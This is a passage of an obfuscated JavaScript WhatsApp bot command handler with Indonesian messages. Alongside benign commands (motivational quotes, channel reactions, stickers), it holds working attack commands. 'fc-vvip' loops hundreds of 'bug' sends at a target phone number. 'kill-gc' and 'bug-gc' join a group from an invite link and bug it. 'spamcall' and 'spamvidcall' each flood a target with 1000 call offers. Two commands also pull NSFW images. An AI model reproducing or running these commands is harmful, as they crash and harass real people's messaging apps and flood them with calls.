      case "fc-vvip":
        {
          if (!_0x46588c) {
            return _0x122228.reply("ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ");
          }
          if (!q) {
            return _0x4d86cf("❓ *ᴘᴇɴɢɢᴜɴᴀᴀɴ*: " + (_0x539711 + _0x5e99b8) + " 628×××");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x7ef89b = "╔═━═━═━═━═━═━═━═╗\n║╔━━━━━━━━━━━━━╗\n║┃𝐒𝐔𝐊𝐒𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆 😈̳⃨\n║╚━━━━━━━━━━━━━╝\n║\n║TIPE BUG ⧼ " + _0x5e99b8 + " ⧽\n║\n║TARGET ⧼ " + target + " ⧽\n║\n║STATUS ⧼ sᴜᴄᴄᴇs ⧽\n║\n║ℕ𝕆𝕋𝔼 ⧼ ᴊᴇᴅᴀ 𝟻ᴍᴇɴɪᴛ ⧽\n╚═━═━═━═━═━═━═━═╝";
          const _0x46ace8 = {
            image: {
              url: "https://files.catbox.moe/g8o93j.jpg"
            },
            caption: _0x7ef89b,
            gifPlayback: false
          };
          const _0x4a8629 = {
            quoted: _0x321efd
          };
          _0x40d3ea.sendMessage(_0x122228.chat, _0x46ace8, _0x4a8629);
          const _0x3bc1fa = {
            quoted: _0x282f41
          };
          await _0x40d3ea.sendMessage(_0x122228.chat, {
            audio: fs.readFileSync("./gallery/curserdv3.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, _0x3bc1fa);
          for (let _0x56f2b2 = 0; _0x56f2b2 < 99; _0x56f2b2++) {
            await _0x1fb37b(target);
            await _0x413315(_0x40d3ea, target, false);
            await _0x1fb37b(target);
            await _0x413315(_0x40d3ea, target, false);
            await _0x1fb37b(target);
            await _0x413315(_0x40d3ea, target, false);
            await _0x1fb37b(target);
            await _0x413315(_0x40d3ea, target, false);
            await _0x1fb37b(target);
            await _0x413315(_0x40d3ea, target, false);
            await _0x1fb37b(target);
            await _0x413315(_0x40d3ea, target, false);
            await _0x1fb37b(target);
            await _0x413315(_0x40d3ea, target, false);
            await _0x1fb37b(target);
            await _0x413315(_0x40d3ea, target, false);
            await _0x1fb37b(target);
            await _0x413315(_0x40d3ea, target, false);
          }
          let _0x4a6d3e = "*_" + _0x5e99b8 + "𝐁𝐔𝐆 𝐒𝐔𝐂𝐊𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐓𝐀𝐑𝐆𝐄𝐓 !!" + _0x5e99b8 + "_*\n> *𝙿𝚕𝚎𝚊𝚜𝚎 𝚙𝚊𝚞𝚜𝚎 𝚏𝚘𝚛 5 𝚖𝚒𝚗𝚞𝚝𝚎*";
          const _0x401144 = {
            image: {
              url: "https://files.catbox.moe/xbrl74.jpg"
            },
            caption: _0x4a6d3e,
            gifPlayback: false
          };
          const _0x444cad = {
            quoted: _0x282f41
          };
          _0x40d3ea.sendMessage(_0x122228.chat, _0x401144, _0x444cad);
        }
        break;
      case "cekidch":
      case "idch":
        {
          if (!_0x8ab39f) {
            return _0x4d86cf("linkchnya");
          }
          if (!_0x8ab39f.includes("https://whatsapp.com/channel/")) {
            return _0x4d86cf("Link tautan tidak valid");
          }
          let _0x1a1e17 = _0x8ab39f.split("https://whatsapp.com/channel/")[1];
          try {
            let _0x2b2f6c = await _0x40d3ea.newsletterMetadata("invite", _0x1a1e17);
            if (!_0x2b2f6c) {
              return _0x4d86cf("Gagal mengambil metadata");
            }
            let _0x217218 = "\n*ID :* " + _0x2b2f6c.id + "\n*Nama :* " + _0x2b2f6c.name + "\n*Total Pengikut :* " + _0x2b2f6c.subscribers + "\n*Status :* " + _0x2b2f6c.state + "\n*Verified :* " + (_0x2b2f6c.verification == "VERIFIED" ? "Terverifikasi" : "Tidak") + "\n        ";
            return _0x4d86cf(_0x217218);
          } catch (_0x1b99c8) {
            console.error(_0x1b99c8);
            return _0x4d86cf("Terjadi kesalahan saat mengambil metadata");
          }
        }
        break;
      case "motivasi":
        {
          try {
            const _0x216f08 = ["Jangan sedih ya! Setiap masalah pasti ada jalan keluarnya 💪", "Tetap semangat! Badai pasti berlalu dan hari esok akan lebih cerah ☀️", "Kamu lebih kuat dari yang kamu kira! Percaya pada dirimu sendiri 🤗", "Setiap kesulitan adalah batu loncatan untuk versi terbaik dirimu 💎", "Jangan menyerah! Hari-hari sulit hanya sementara ⏳", "Kamu tidak sendirian. Masih banyak yang peduli dan menyayangimu ❤️", "Ambil napas dalam-dalam. Semua akan baik-baik saja pada waktunya 🌬️", "Masalahmu hari ini akan menjadi cerita suksesmu di masa depan 📖", "Tetaplah berjalan, sekecil apapun langkahmu itu tetap progres 🚶‍♂️", "Kesedihanmu valid, tapi ingat kebahagiaan akan datang kembali 😊", "Hidup seperti roda, kadang di atas kadang di bawah. Yang penting tetap bergerak 🎮", "Tidak ada awan yang tak berlalu, tidak ada malam yang tak berganti pagi 🌄", "Kamu adalah bintang yang bersinar terang di antara kegelapan ✨", "Setiap tetes air mata adalah pupuk untuk kebahagiaan yang akan tumbuh 🌱", "Jangan bandingkan perjalananmu dengan orang lain. Setiap orang punya waktunya sendiri ⏰", "Kegagalan bukan akhir, tapi awal yang baru dengan pengalaman lebih 📚", "Diri kamu saat ini adalah versi terkuat dari semua versi sebelumnya 🦸‍♂️", "Sedih itu manusiawi, tapi jangan terlalu lama. Bangkit lagi ya! 💫", "Masalah datang bukan untuk menjatuhkanmu, tapi mengajarimu cara terbang 🦅", "Hari ini mungkin berat, tapi lihatlah betapa jauh kamu sudah bertahan 👣", "Tidak ada yang abadi di dunia ini, termasuk kesulitan yang kamu hadapi 🌏", "Kamu punya kekuatan lebih dari yang kamu sadari. Percayalah! 💥", "Setiap hari adalah kesempatan baru untuk memulai lagi dengan semangat baru 🌈", "Jangan takut gagal, takutlah jika tidak pernah mencoba 🧗‍♀️", "Kesuksesan terbesar adalah bangkit setiap kali terjatuh 🏆", "Air mata membersihkan jiwa seperti hujan membersihkan bumi 🌧️", "Kamu layak dicintai, dihargai, dan bahagia. Jangan lupa itu! 💖", "Tantangan hidup membuatmu lebih bijak dan kuat dari sebelumnya 🧠", "Jangan biarkan satu bab buruk menghentikanmu menulis kisah indah 📖", "Kadang kita harus melalui kegelapan untuk benar-benar menghargai terang 💡", "Setiap orang punya waktunya sendiri. Jangan bandingkan hidupmu dengan orang lain ⏳", "Kamu adalah karya seni yang masih dalam proses. Nikmati setiap tahapannya 🎨", "Hidup bukan tentang seberapa cepat, tapi seberapa bermakna perjalanannya 🛤️", "Jangan biarkan orang lain menentukan nilai dirimu. Kamu lebih dari itu 💎", "Setiap mimpi besar dimulai dengan langkah kecil pertama 🚀", "Kekuatan terbesar datang dari mengatasi apa yang kamu pikir tidak bisa kamu atasi 💪", "Kesempatan baru akan datang kepada mereka yang tetap bertahan 🌅", "Kamu tidak gagal, kamu hanya menemukan cara yang tidak berhasil 🔍", "Dunia membutuhkan keunikanmu. Jangan pernah berhenti menjadi diri sendiri 🌍", "Sesulit apapun hari ini, percayalah besok akan lebih baik 🌤️", "Kamu adalah kapten dari kapal hidupmu. Arahkan ke tujuan terbaikmu ⛵", "Tidak ada yang bisa mengubah masa lalu, tapi masa depan masih bisa kamu tulis ✍️", "Kegelapan hanya sementara, cahaya akan selalu menemukan jalannya kembali 🔦", "Jangan takut istirahat sejenak, yang penting tidak berhenti selamanya 🛌", "Setiap orang punya pertarungannya sendiri. Bersabarlah dengan dirimu 🥊", "Kamu tidak perlu sempurna, cukup menjadi lebih baik dari kemarin 🌟", "Hidup terlalu singkat untuk terus bersedih. Nikmati setiap momennya 🎉", "Kadang kita harus kehilangan sesuatu untuk mendapatkan yang lebih baik 🔄", "Kesabaran adalah kunci. Semua hal baik datang pada waktunya 🗝️", "Jangan biarkan ketakutan menghentikanmu dari potensi terbesarmu 🚧", "Setiap kali kamu berpikir untuk menyerah, ingat mengapa kamu memulai 🧭", "Kamu adalah penulis kisah hidupmu. Buatlah cerita yang membanggakan 📘", "Tidak ada yang tidak mungkin bagi mereka yang terus berusaha ♾️", "Kekuatan sejati adalah tetap tersenyum meski hati sedang terluka 😊", "Masalah adalah guru terbaik dalam sekolah kehidupan 🎓", "Jangan biarkan kesedihan mencuri kebahagiaan masa depanmu 🚔", "Setiap detik adalah kesempatan untuk memulai kembali ⏱️", "Kamu dilahirkan untuk menjadi nyata, bukan untuk menjadi sempurna 🧩", "Hujan badai terkuat pun akan berakhir dengan pelangi yang indah 🌈", "Tidak ada yang abadi, termasuk rasa sakit yang kamu rasakan sekarang ⏲️", "Kamu punya lebih banyak keberanian dari yang kamu sadari 🦁", "Kegagalan adalah bumbu yang membuat kesuksesan terasa lebih nikmat 🧂", "Jangan melihat ke belakang dengan penyesalan, tapi dengan pelajaran 🧠", "Hidup ini seperti fotografi. Kamu butuh negatif untuk berkembang 📸", "Tidak ada yang bisa menghentikan seseorang dengan sikap positif 💃", "Kamu adalah kombinasi unik dari bakat dan kelebihan. Hargai itu! 🎭", "Tidak peduli seberapa lambat, yang penting tidak berhenti 🐢", "Setiap orang adalah bintang, hanya perlu menemukan langit yang tepat 🌠", "Jangan biarkan siapapun mengatakan kamu tidak cukup baik �", "Kamu adalah hasil dari perjuangan yang tidak pernah menyerah 🏅", "Terkadang kita harus tersesat dulu untuk menemukan jalan terbaik 🗺️", "Hidup bukan tentang menunggu badai berlalu, tapi belajar menari di tengah hujan 🌧️💃", "Kamu punya kekuatan untuk mengubah hidupmu mulai hari ini 🎛️", "Tidak ada yang bisa membuatmu merasa rendah tanpa persetujuanmu 👑", "Setiap mimpi yang kamu kejar membuat hidup lebih berarti 🛌💭", "Kamu adalah cahaya yang bisa menerangi dunia sekitarmu 🔆", "Jangan takut berbeda. Ketidaksempurnaan membuatmu unik 🦄", "Kesulitan hari ini adalah cerita inspiratif di masa depan 📜", "Tidak ada yang bisa menghalangi tekad yang kuat 🚀", "Kamu lebih berani dari ketakutanmu, lebih kuat dari keraguanmu 🦸‍♀️", "Setiap kali kamu bangkit dari kegagalan, kamu tumbuh lebih kuat 🌳", "Jangan biarkan masa lalu yang gelap menutupi masa depan yang cerah ☀️", "Kamu adalah kombinasi dari semua perjuangan dan kemenanganmu 🏋️‍♂️", "Tidak ada yang tidak mungkin jika kamu mau terus mencoba ♻", "Setiap langkah kecil membawamu lebih dekat ke impian besar 👟", "Kamu dilahirkan untuk menjadi pembeda. Jangan takut bersinar! 💡", "Hidup ini singkat, jangan habiskan dengan kesedihan yang berkepanjangan ⏳", "Kamu adalah masterpiece yang masih dalam proses penyempurnaan 🖼️", "Tidak ada yang bisa menghentikan seseorang yang tidak pernah menyerah 🛑", "Setiap hari adalah halaman baru yang bisa kamu tulis dengan indah 📖", "Jangan biarkan satu kegagalan menentukan cerita hidupmu 📕", "Kamu punya kekuatan untuk mengubah segalanya mulai hari ini ⚡", "Tidak ada yang bisa mengambil harapan kecuali kamu melepaskannya 🎈", "Setiap tantangan adalah kesempatan untuk tumbuh lebih kuat 🌱", "Jangan bandingkan bab pertamamu dengan bab terakhir orang lain 📚", "Kamu adalah pencipta takdirmu sendiri. Percayalah pada dirimu! ✨", "Tidak ada mimpi yang terlalu besar jika kamu mau bekerja keras 🏗️", "Setiap rintangan membuat kemenangan terasa lebih manis 🍯", "Jangan takut bermimpi besar. Takutlah tidak bermimpi sama sekali 🛌", "Kamu adalah kapten dari jiramu sendiri. Arahkan ke kebahagiaan ⛵", "Tidak ada yang bisa menghentikan kekuatan pikiran positif 🧠", "Setiap kali kamu berpikir untuk menyerah, ingat alasan kamu mulai 🧭", "Jangan biarkan ketakutan menghentikanmu dari potensi terbesarmu 🚫", "Kamu adalah kombinasi unik dari bakat dan kelebihan. Hargai itu! 🎯", "Tidak peduli seberapa lambat, yang penting tidak berhenti 🐌", "Setiap orang adalah bintang, hanya perlu menemukan langit yang tepat 🌌", "Jangan biarkan siapapun mengatakan kamu tidak cukup baik 🚫", "Kamu adalah hasil dari perjuangan yang tidak pernah menyerah 🥇", "Terkadang kita harus tersesat dulu untuk menemukan jalan terbaik 🧭", "Hidup bukan tentang menunggu badai berlalu, tapi belajar menari di tengah hujan ⛈️💃", "Kamu punya kekuatan untuk mengubah hidupmu mulai hari ini 💪", "Tidak ada yang bisa membuatmu merasa rendah tanpa persetujuanmu 👑", "Setiap mimpi yang kamu kejar membuat hidup lebih berarti 💭", "Kamu adalah cahaya yang bisa menerangi dunia sekitarmu 💡", "Jangan takut berbeda. Ketidaksempurnaan membuatmu unik 🦓", "Kesulitan hari ini adalah cerita inspiratif di masa depan 📖", "Tidak ada yang bisa menghalangi tekad yang kuat 🚧", "Kamu lebih berani dari ketakutanmu, lebih kuat dari keraguanmu 🦁", "Setiap kali kamu bangkit dari kegagalan, kamu tumbuh lebih kuat 🌲", "Jangan biarkan masa lalu yang gelap menutupi masa depan yang cerah 🔆", "Kamu adalah kombinasi dari semua perjuangan dan kemenanganmu 🏆", "Tidak ada yang tidak mungkin jika kamu mau terus mencoba 🔄", "Setiap langkah kecil membawamu lebih dekat ke impian besar 👣", "Kamu dilahirkan untuk menjadi pembeda. Jangan takut bersinar! ✨", "Hidup ini singkat, jangan habiskan dengan kesedihan yang berkepanjangan ⏳", "Kamu adalah masterpiece yang masih dalam proses penyempurnaan 🎨", "Tidak ada yang bisa menghentikan seseorang yang tidak pernah menyerah 🛑", "Setiap hari adalah halaman baru yang bisa kamu tulis dengan indah 📓", "Jangan biarkan satu kegagalan menentukan cerita hidupmu 📖", "Kamu punya kekuatan untuk mengubah segalanya mulai hari ini ⚡", "Tidak ada yang bisa mengambil harapan kecuali kamu melepaskannya 🎈", "Setiap tantangan adalah kesempatan untuk tumbuh lebih kuat 🌿", "Jangan bandingkan bab pertamamu dengan bab terakhir orang lain 📕", "Kamu adalah pencipta takdirmu sendiri. Percayalah pada dirimu! 🌟", "Tidak ada mimpi yang terlalu besar jika kamu mau bekerja keras 🏗️", "Setiap rintangan membuat kemenangan terasa lebih manis �", "Jangan takut bermimpi besar. Takutlah tidak bermimpi sama sekali 💤", "Kamu adalah kapten dari jiramu sendiri. Arahkan ke kebahagiaan 🧭", "Tidak ada yang bisa menghentikan kekuatan pikiran positif �", "Setiap kali kamu berpikir untuk menyerah, ingat alasan kamu mulai 🏁", "Jangan biarkan ketakutan menghentikanmu dari potensi terbesarmu 🚷", "Kamu adalah kombinasi unik dari bakat dan kelebihan. Hargai itu! 🎁", "Tidak peduli seberapa lambat, yang penting tidak berhenti 🐢", "Kamu sudah cukup baik dan sabar untuk menghadapi dunia yang sangat kejam💖", "Setiap orang adalah bintang, hanya perlu menemukan langit yang tepat 🌃", "Jangan biarkan siapapun mengatakan kamu tidak cukup baik 🚯", "Kamu adalah hasil dari perjuangan yang tidak pernah menyerah 🏅", "Terkadang kita harus tersesat dulu untuk menemukan jalan terbaik 🧭", "Hidup bukan tentang menunggu badai berlalu, tapi belajar menari di tengah hujan 🌧️🕺"];
            const _0x3f608d = _0x216f08[Math.floor(Math.random() * _0x216f08.length)];
            const _0xa328ef = {
              quoted: _0x282f41
            };
            await _0x40d3ea.sendMessage(_0x122228.chat, {
              text: "@" + _0x122228.sender.split("@")[0] + " " + _0x3f608d,
              mentions: [_0x122228.sender]
            }, _0xa328ef);
            await _0x40d3ea.sendMessage(_0x122228.chat, {
              react: {
                text: "💌",
                key: _0x122228.key
              }
            });
          } catch (_0x3a1f3d) {
            console.error("Error sending advice:", _0x3a1f3d);
            const _0x44e911 = {
              quoted: _0x282f41
            };
            await _0x40d3ea.sendMessage(_0x122228.chat, {
              text: "Kamu kuat! Jangan biarkan apapun merenggut senyummu hari ini 😊",
              mentions: [_0x122228.sender]
            }, _0x44e911);
          }
          break;
        }
      case "reactch":
      case "ch":
        {
          if (!_0x34c793) {
            return _0x4d86cf("𝙼𝙰𝙰𝙵 𝙵𝙸𝚃𝚄𝚁 𝙺𝙷𝚄𝚂𝚄𝚂 𝙾𝚆𝙽𝙴𝚁");
          }
          if (!_0x8ab39f) {
            return _0x4d86cf("Contoh:\n.reactch https://whatsapp.com/channel/xxx/123 ❤️biyu\n.reactch https://whatsapp.com/channel/xxx/123 ❤️biyu|5");
          }
          const _0x1cf4be = {
            a: "🅐",
            b: "🅑",
            c: "🅒",
            d: "🅓",
            e: "🅔",
            f: "🅕",
            g: "🅖",
            h: "🅗",
            i: "🅘",
            j: "🅙",
            k: "🅚",
            l: "🅛",
            m: "🅜",
            n: "🅝",
            o: "🅞",
            p: "🅟",
            q: "🅠",
            r: "🅡",
            s: "🅢",
            t: "🅣",
            u: "🅤",
            v: "🅥",
            w: "🅦",
            x: "🅧",
            y: "🅨",
            z: "🅩",
            "0": "⓿",
            "1": "➊",
            "2": "➋",
            "3": "➌",
            "4": "➍",
            "5": "➎",
            "6": "➏",
            "7": "➐",
            "8": "➑",
            "9": "➒"
          };
          const [_0xf255bc, _0x43b4ce] = _0x8ab39f.split("|");
          const _0x5595f3 = _0xf255bc.trim().split(" ");
          const _0x4e2808 = _0x5595f3[0];
          if (!_0x4e2808.includes("https://whatsapp.com/channel/")) {
            return _0x4d86cf("Link tidak valid!\nContoh: .reactch https://whatsapp.com/channel/xxx/idpesan ❤️biyu|3");
          }
          const _0x47ba97 = _0x4e2808.split("/")[4];
          const _0x39827d = parseInt(_0x4e2808.split("/")[5]);
          if (!_0x47ba97 || isNaN(_0x39827d)) {
            return _0x4d86cf("Link tidak lengkap!");
          }
          const _0x529c6b = parseInt(_0x43b4ce?.trim()) || 1;
          const _0x1bddf8 = _0x5595f3.slice(1).join(" ");
          const _0x5a2823 = _0x1bddf8.replace(_0x4e2808, "").trim();
          if (!_0x5a2823) {
            return _0x4d86cf("Masukkan teks/emoji untuk direaksikan.");
          }
          const _0x44bda9 = _0x5a2823.toLowerCase().split("").map(_0x492d50 => {
            if (_0x492d50 === " ") {
              return "―";
            }
            return _0x1cf4be[_0x492d50] || _0x492d50;
          }).join("");
          try {
            const _0x4f5d1e = await _0x40d3ea.newsletterMetadata("invite", _0x47ba97);
            let _0x12aba5 = 0;
            let _0xcb18e6 = 0;
            for (let _0x3ca3b1 = 0; _0x3ca3b1 < _0x529c6b; _0x3ca3b1++) {
              const _0x5ed493 = (_0x39827d - _0x3ca3b1).toString();
              try {
                await _0x40d3ea.newsletterReactMessage(_0x4f5d1e.id, _0x5ed493, _0x44bda9);
                _0x12aba5++;
              } catch (_0x1ab5d5) {
                _0xcb18e6++;
              }
            }
            _0x4d86cf("✅ Berhasil kirim reaction *" + _0x44bda9 + "* ke " + _0x12aba5 + " pesan di channel *" + _0x4f5d1e.name + "*\n❌ Gagal di " + _0xcb18e6 + " pesan");
          } catch (_0x5d11bf) {
            console.error(_0x5d11bf);
            _0x4d86cf("❌ Gagal memproses permintaan!");
          }
        }
        break;
      case "tolol":
      case "bang":
      case "sayang":
      case "penipu":
        {
          if (!_0x5e5de3) {
            return _0x122228.reply("ʙᴏᴛ ᴏɴʟʏ");
          }
          await _0x3dc2b7(_0x122228.chat, "💥");
          {
            await _0x57c58f(_0x122228.chat);
          }
        }
        break;
      case "gasken":
      case "kill-gc":
      case "bug-gc":
      case "gc-ultimate":
        {
          if (!_0x46588c) {
            return _0x4d86cf("𝙽𝙾𝚃 𝙿𝚁𝙴𝙼𝙸𝚄𝙼❗");
          }
          if (!q) {
            return _0x4d86cf("𝙷𝙰𝚁𝙰𝙿 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙻𝙸𝙽𝙺 𝙶𝚁𝚄𝙿");
          }
          let _0x5c7b25 = _0x1a8c93[0];
          let _0x5b3bf6;
          if (_0x5c7b25.includes("https://chat.whatsapp.com/")) {
            _0x5b3bf6 = _0x5c7b25.split("https://chat.whatsapp.com/")[1];
            if (!_0x5b3bf6) {
              return _0x4d86cf("Tautan grup tidak valid.");
            }
            let _0x3d7896 = await _0x40d3ea.groupAcceptInvite(_0x5b3bf6);
            _0x4d86cf("*𝐒𝐮𝐤𝐬𝐞𝐬* " + _0x5e99b8 + " 𝐝𝐢𝐤𝐢𝐫𝐢𝐦 𝐤𝐞 𝐠𝐫𝐮𝐩 𝐝𝐞𝐧𝐠𝐚𝐧 𝐭𝐚𝐮𝐭𝐚𝐧: " + _0x5c7b25 + " (𝐈𝐃 𝐆𝐫𝐮𝐩: " + _0x5b3bf6 + ")");
            await _0xd68a62(_0x3d7896);
            await _0x387e39(1000);
          } else {
            _0x5b3bf6 = _0x5c7b25;
            let _0xf9d282 = _0x5b3bf6;
            _0x4d86cf("*𝐒𝐮𝐤𝐬𝐞𝐬* " + _0x5e99b8 + " 𝐝𝐢𝐤𝐢𝐫𝐢𝐦 𝐤𝐞 𝐠𝐫𝐮𝐩 𝐝𝐞𝐧𝐠𝐚𝐧 𝐈𝐃 𝐆𝐫𝐮𝐩: " + _0x5b3bf6);
            await _0x28b822(_0xf9d282);
          }
        }
        break;
      case "brat":
      case "bratimg":
        {
          if (!_0x8ab39f) {
            return _0x122228.reply("teksnya");
          }
          const _0xaa89e9 = require("axios");
          let _0x1fbf1c = "https://api.siputzx.my.id/api/m/brat?text=" + encodeURIComponent(_0x8ab39f) + "&isVideo=false&delay=500";
          let _0xec5dd1 = await _0xaa89e9.get(_0x1fbf1c, {
            responseType: "arraybuffer"
          });
          let _0x234389 = _0xec5dd1.data;
          try {
            const _0x726fc8 = {
              packname: global.packname
            };
            await _0x40d3ea.sendAsSticker(_0x122228.chat, _0x234389, _0x122228, _0x726fc8);
          } catch {}
        }
        break;
        async function _0x38ee31() {
          return new Promise((_0x60d4f, _0x29959f) => {
            const _0x523bd4 = Math.floor(Math.random() * 1153);
            axios.get("https://sfmcompile.club/page/" + _0x523bd4).then(_0x560456 => {
              const _0x1f175f = cheerio.load(_0x560456.data);
              const _0x39ba88 = [];
              _0x1f175f("#primary > div > div > ul > li > article").each(function (_0x1ffa98, _0x123c7f) {
                _0x39ba88.push({
                  title: _0x1f175f(_0x123c7f).find("header > h2").text(),
                  link: _0x1f175f(_0x123c7f).find("header > h2 > a").attr("href"),
                  category: _0x1f175f(_0x123c7f).find("header > div.entry-before-title > span > span").text().replace("in ", ""),
                  share_count: _0x1f175f(_0x123c7f).find("header > div.entry-after-title > p > span.entry-shares").text(),
                  views_count: _0x1f175f(_0x123c7f).find("header > div.entry-after-title > p > span.entry-views").text(),
                  type: _0x1f175f(_0x123c7f).find("source").attr("type") || "image/jpeg",
                  video_1: _0x1f175f(_0x123c7f).find("source").attr("src") || _0x1f175f(_0x123c7f).find("img").attr("data-src"),
                  video_2: _0x1f175f(_0x123c7f).find("video > a").attr("href") || ""
                });
              });
              _0x60d4f(_0x39ba88);
            });
          });
        }
      case "andom-image":
        {
          if (!_0x46588c) {
            return _0x4d86cf("𝙽𝙾𝚃 𝙿𝚁𝙴𝙼𝙸𝚄𝙼❗");
          }
          async function _0x41ded7() {
            try {
              let _0x5c2d2e = await axios.get("https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1");
              let _0x5d682e = _0x5c2d2e.data;
              if (!Array.isArray(_0x5d682e) || _0x5d682e.length === 0) {
                throw new Error("No images found");
              }
              let _0xef9f05 = _0x5d682e[Math.floor(Math.random() * _0x5d682e.length)];
              let _0xa23ccf = _0xef9f05.file_url;
              if (!_0xa23ccf) {
                throw new Error("Image URL not found");
              }
              const _0x569066 = {
                status: 200,
                imageUrl: _0xa23ccf
              };
              return _0x569066;
            } catch (_0x1021ce) {
              console.error("Error:", _0x1021ce);
              const _0x2494bf = {
                status: 500,
                error: _0x1021ce.message
              };
              return _0x2494bf;
            }
          }
          async function _0x19dc7a(_0x2effc6) {
            try {
              let _0x808bf4 = await _0x41ded7();
              if (_0x808bf4.status !== 200) {
                throw new Error(_0x808bf4.error);
              }
              let _0x1c0fca = _0x808bf4.imageUrl;
              const _0x3ef22e = {
                url: _0x1c0fca
              };
              const _0xe27a44 = {
                image: _0x3ef22e,
                caption: "Random image sudah di send © Liam"
              };
              _0x40d3ea.sendMessage(_0x2effc6.chat, _0xe27a44, {
                quoted: _0x2effc6
              });
            } catch (_0xfbfb82) {
              reply(_0xfbfb82.message);
            }
          }
          _0x19dc7a(_0x122228);
        }
        break;
      case "anime-sus":
        if (!_0x46588c) {
          return _0x4d86cf("𝙽𝙾𝚃 𝙿𝚁𝙴𝙼𝙸𝚄𝙼❗");
        }
        let _0x23a1f6 = await axios.get("https://waifu.pics/api/nsfw/neko");
        const _0xf75978 = {
          url: _0x23a1f6.data.url
        };
        const _0x5592cf = {
          caption: "𝙳𝙰𝚂𝙰𝚁 𝙾𝚃𝙰𝙺 𝙱𝙾𝙺𝙴𝙿 😹",
          image: _0xf75978
        };
        _0x40d3ea.sendMessage(_0x122228.chat, _0x5592cf, {
          quoted: _0x122228
        });
        break;
      case "spamcall":
        {
          if (!_0x46588c) {
            return _0x4d86cf("𝙽𝙾𝚃 𝙿𝚁𝙴𝙼𝙸𝚄𝙼❗");
          }
          if (!q) {
            return _0x4d86cf("ᴍᴀsᴜᴋᴀɴ ɴᴜᴍʙᴇʀ ᴛᴀʀɢᴇᴛ ᴄᴏɴᴛᴏʜ " + _0x5e99b8 + " : 𝟼𝟸𝟾++++");
          }
          let _0x4f1d54;
          if (_0x122228.mentionedJid?.length > 0) {
            _0x4f1d54 = _0x122228.mentionedJid[0];
          } else {
            let _0x5439b6 = q.replace(/[^0-9]/g, "");
            if (_0x5439b6.startsWith("0")) {
              _0x4f1d54 = _0x5439b6 + "@s.whatsapp.net";
            }
            lockNum = "" + _0x5439b6;
          }
          let _0x27a173 = _0x4f1d54;
          let _0x6fb3ec = lockNum;
          let _0x59c55d = "╔═━═━═━═━═━═━═━═╗\n║╔━━━━━━━━━━━━━╗\n║┃𝐒𝐔𝐊𝐒𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆 😈̳⃨\n║╚━━━━━━━━━━━━━╝\n║\n║TIPE BUG ⧼ " + _0x5e99b8 + " ⧽\n║\n║TARGET ⧼ " + _0x27a173 + " ⧽\n║\n║STATUS ⧼ sᴜᴄᴄᴇs ⧽\n║\n║ℕ𝕆𝕋𝔼 ⧼ ᴊᴇᴅᴀ 𝟻ᴍᴇɴɪᴛ ⧽\n╚═━═━═━═━═━═━═━═╝";
          for (let _0x5a5ea7 = 0; _0x5a5ea7 < 1000; _0x5a5ea7++) {
            console.log(chalk.green("𝐒̲̲̅̅͟𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐓̲̲̅̅͟𝐔̲̲̅̅͟𝐒̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ sᴜᴄᴄᴇs ｠"));
            await sendOfferCall(_0x40d3ea, _0x27a173);
          }
        }
        break;
      case "spamvidcall":
        {
          if (!_0x46588c) {
            return _0x4d86cf("𝙽𝙾𝚃 𝙿𝚁𝙴𝙼𝙸𝚄𝙼❗");
          }
          if (!q) {
            return _0x4d86cf("ᴍᴀsᴜᴋᴀɴ ɴᴜᴍʙᴇʀ ᴛᴀʀɢᴇᴛ ᴄᴏɴᴛᴏʜ " + _0x5e99b8 + " : 𝟼𝟸𝟾++++");
          }
          let _0x518124;
          if (_0x122228.mentionedJid?.length > 0) {
            _0x518124 = _0x122228.mentionedJid[0];
          } else {
            let _0x4732e6 = q.replace(/[^0-9]/g, "");
            if (_0x4732e6.startsWith("0")) {
              _0x518124 = _0x4732e6 + "@s.whatsapp.net";
            }
            lockNum = "" + _0x4732e6;
          }
          let _0x307938 = _0x518124;
          let _0x35e659 = lockNum;
          let _0x7e6a56 = "╔═━═━═━═━═━═━═━═╗\n║╔━━━━━━━━━━━━━╗\n║┃𝐒𝐔𝐊𝐒𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆 😈̳⃨\n║╚━━━━━━━━━━━━━╝\n║\n║TIPE BUG ⧼ " + _0x5e99b8 + " ⧽\n║\n║TARGET ⧼ " + _0x307938 + " ⧽\n║\n║STATUS ⧼ sᴜᴄᴄᴇs ⧽\n║\n║ℕ𝕆𝕋𝔼 ⧼ ᴊᴇᴅᴀ 𝟻ᴍᴇɴɪᴛ ⧽\n╚═━═━═━═━═━═━═━═╝";
          for (let _0x4fc856 = 0; _0x4fc856 < 1000; _0x4fc856++) {
            console.log(chalk.green("𝐒̲̲̅̅͟𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐓̲̲̅̅͟𝐔̲̲̅̅͟𝐒̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ sᴜᴄᴄᴇs ｠"));
            await _0x1b7880(_0x40d3ea, _0x307938);
          }
        }
        break;
      case "qc":
        {
          if (!q) {
            return _0x4d86cf("𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝚃𝙴𝙺𝚂𝙽𝚈𝙰 " + (_0x539711 + _0x5e99b8) + " 𝙻𝙸𝙰𝙼 𝚃𝙰𝙼𝚅𝙰𝙽");
          }
          let _0x10ba42 = {
            type: "quote",
            format: "png",
            backgroundColor: "#ffffff",
            width: 512,
            height: 768,
            scale: 2,
            messages: [{
              entities: [],
              avatar: true,
              from: {
                id: 1,
                name: "" + _0x4f3f06,
                photo: {
                  url: await _0x40d3ea.profilePictureUrl(_0x122228.sender, "image").catch(() => "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60")
                }
              },
              text: "" + q,
              replyMessage: {}
            }]
          };
          let _0x350ce9 = await axios.post("https://bot.lyo.su/quote/generate", _0x10ba42, {
            headers: {
              "Content-Type": "application/json"
            }
          });
